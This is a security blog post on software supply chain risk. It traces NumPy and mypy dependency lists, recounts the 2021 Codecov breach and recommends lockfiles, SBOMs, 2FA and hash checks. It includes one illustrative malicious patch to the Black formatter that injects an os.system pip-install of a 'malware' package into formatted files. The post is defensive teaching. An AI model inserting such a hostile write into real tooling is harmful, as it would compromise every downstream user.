---
publishDate: 2023-08-03T00:00:00Z
title: The Dependency Dilemma
excerpt: Examining the cascading effect of software supply chain compromises and their mitigation strategies.
image: ~/assets/images/uriel-sc-unsplash.jpg
category: Application Security
tags:
  - supply chain
  - resources
---

## Introduction

No doubt about it, supply chain security is confusing. Packaging ecosystems have rapidly evolved, and packaging standards have struggled to maintain relevancy. Authors will implement their own solutions when one standard does not exist (or is not widely followed) and this can make legitimately considering the software supply chain difficult. And why should you? The package works, it's got a thousand Github stars, it's well known in the community, there's no possible way that this package could be compromised... right?

## What is a supply chain?

When we talk about supply chains in the context of packaging and dependencies, what we actually mean is the full chain of dependencies for a package, down to system level libraries and kernel interfaces. Now this might be a bit gratuitous, but it can make for significant exponentiation when it comes down to considering what is *actually* in a widely installed package.

Consider the following exercise in packaging in the Python ecosystem. A package is published with following dependencies listed.

**helloworld-1.0.1/pyproject.toml**
```toml
dependencies = [
  "numpy>=1.23.2",
]
```

Not a whole lot there, right? At face value this is extremely easy to secure, we have one package that ultimately we need to be responsible for ensuring. This is, at maximum ~20MB in size, and even the most expansive set of static and dynamic application security testing (SAST and DAST, respectively) tools should be able to make quick work of ensuring this package is malware and vulnerability free.

Well let's peel back some layers a bit to see how this unfolds exponentially. NumPy, notoriously, doesn't really have any direct dependencies. NumPy does, however, rely on a build process that utilizes several of the following libraries to perform actions such as documentation upload, distribution building, etc.

## An Exponentiating Attack Surface

**numpy-1.25.2/release-requirements.txt**
```md
urllib3
beatutifulsoup4
pygithub
gitpython>=3.1.30
twine
Paver
```

**numpy-1.25.2/test_requirements.txt**
```md
Cython
setuptools
hypothesis
pytest
pytz
pytest-cov
meson
pytest-xdist
cffi
mypy
typing-extensions
charset-normalizer
```

Presumably, a number of these aren't going to directly interface with your install unless you're running certain distributions of the Python interpreter. However, what is relevant, is that these provide standardized attack surfaces for NumPy itself. During the build process, it's no stretch of the imagination to consider that, in this example, malicious code may be inserted into the application during the build stage by twine for instance, or during the testing stage by mypy. While it's hard to imagine these applications being compromised, we can extend that same leniency to Numpy, a dependency free application as well.

But these packages have dependencies too, right?

**mypy-1.4.1/test-requirements.txt**
```md
attrs>=18.0
black==23.3.0
filelock>=3.3.0
flake8==6.0.0
flake8-bugbear==23.3.23
flake8-noqa==1.3.1
isort[colors]==5.12.0
lxml>=4.9.1
pre-commit
pre-commit-hooks==4.4.0
psutil>=4.0
pytest>=6.2.4,<7.4.0
pytest-xdist>=1.34.0
pytest-forked>=1.3.0,<2.0.0
pytest-cov>=2.10.0
py>=1.5.2
setuptools>=65.5.1
six
tomli>=1.1.0
```

**mypy-1.4.1/mypy-requirements.txt**
```txt
typing_extensions>=4.1.0
mypy_extensions>=1.0.0
typed_ast>=1.4.0,<2; python_version<'3.8'
tomli>=1.1.0; python_version<'3.11'
```

Well this is starting to get a little out of control.  To save from typing a full Software Bill of Materials (SBOM) in the context of a blog post, I'll fast forward a bit to a practical example of how malware might propagate up through the supply chain into an end-user installation.

## A Poisoned Pipeline

If we look at the above lists and enumerate them down to their core dependencies, we're going to see that often, `black` is going to appear as a fairly common code formatter. And why wouldn't it? Code formatting improves readability and standardizes code formatting in a way that everyone can understand and comprehend (usually).

But we're thinking with security in mind, and this represents a single point of extreme concern when it comes to the software supply chain. Mind you, before I go down this rabbit hole, I have no reason to doubt the security of Black. But for this exercise, it presents a ripe target because of a specific feature it has embedded within it, which is the intentional functionality to modify your code when invoked.

And this makes sense for a code formatting tool... In fact, it's more or less the premise. But imagine for a moment, I make a pull request and simply...

**black/src/black__init__.py**
```python
def format_file_in_place(...):
	 ...
	 if write_back == WriteBack.YES:
	        with open(src, "w", encoding=encoding, newline=newline) as f:
		        f.write("import os;os.system('python -m pip install malware')")
	            f.write(dst_contents)
```

Now what havoc could we cause with this? This fictitious package 'malware' could do any number of things, but notably it could easily contain arbitrary code execution in the **setup.py** file, which could in turn compromise any package that utilizes Black as a code formatting tool. This distinguished list includes Django, pytest, tox, Warehouse, Virtualenv, pandas, etc. And of course, we saw that mypy utilizes Black, which in turn causes a dependency free Numpy to potentially be compromised if we extend the project spec a bit to include this fictitious 'malware' package locating and writing itself to other Python files on the system. Hopefully this pull request would never pass review... but mistakes happen.

Are you thinking about supply chain security yet?

## It's Happened Before

On January 31st 2021, a threat actor gained access to Codecov's Bash Uploader script credentials and modified it without their permission.

> The actor gained access because of an error in Codecov's Docker image creation process that allowed the actor to extract the credential required to modify our Bash Uploader Script

*[Codecov Security Update](https://about.codecov.io/security-update/)*

This attack utilized a CI/CD tool to compromise user credentials and exfiltrate them to an external service. The attack was able to make numerous changes to the original repository (and subsequently any repositories or codebases that might be affected in these credential breaches). Moreso, this code was repeatedly inserted into the codebase until an observant Codecov consumer noted that the hash for the Bash Uploader script did not match the reported hash.

[GitGuardian reports](https://blog.gitguardian.com/codecov-supply-chain-breach/) that potentially 23,000 users, such as Hashicorp, Twilio, Rapid7, and Confluent, were impacted by this supply chain compromise. These are all significant companies within themselves, and compromised credentials within these organizations could both further taint the supply chain, as well as have cascading effects to customers not even *utilizing* CodeCov.

## Preventative Medicine

So how can we possibly prevent these types of attacks? Principally, it's shockingly difficult. The exponential increase of packaging dependencies as you travel down the tree means that a single compromise may have compounding effects for the supply chain as a whole.

Software Bill of Materials and supply chain security applications stand as one of the best solutions to this issue. Using lockfiles and detecting unanticipated changes can help secure your supply chain and the dependencies that they contain. It's not foolproof-- it requires organizations like ours to detect malicious changes to the dependencies before you have the ability to update your lockfile, but it represents but one layer to prevent these types of attacks.

Additional security controls are ensuring two-factor authentication is present to prevent credential compromise from individuals that may have access to make changes to *your* codebase, as well as ensuring that you are carefully reviewing commits prior to accepting any changes to your codebase.

Furthermore, ensuring CI/CD and pre-commit processes are checked thoroughly in their modifications, as well as regular checking of hashes can help avert these types of attacks outright. Imagine if the customer in the CodeCov example had checked that hash on the first of February? The scope of damage would've been significantly mitigated.

## Resources

Numerous organizations occupy a similar space as we do, performing supply chain security scanning and dependency assurance. The cool part about being Vipyr Security is that we don't really have a product to sell, so we can offer an unbiased list of tools that may help you prevent these types of attacks.

- [Phylum](https://phylum.io) - Phylum publishes excellent research and maintains their own dependency scanning and CI/CD software to enumerate these types of attacks.

- [Snyk](https://snyk.io/) - Snyk maintains a dependency scanning and SAST service for use in development to detect malicious packages and security vulnerabilities in codebases.

- [PyUp](https://pyup.io/) - Automated dependency scanning and CI/CD workflows for Python environments.

## Summary

Supply chain security exponentiates quickly, and a single compromise can have cascading effects on the supply chain as a whole; even if you don't have direct dependencies in that supply chain, it is no stretch of the imagination to think that you may be impacted by compromises in the software supply chain in the future. It's happened before with significant impacts to enterprise organizations who are devoted to providing secure services themselves.

Preventing supply chain attacks is difficult but layered approaches and dependency scanning services can help prevent these kind of attacks from affecting you or propagating through your own software supply chain.
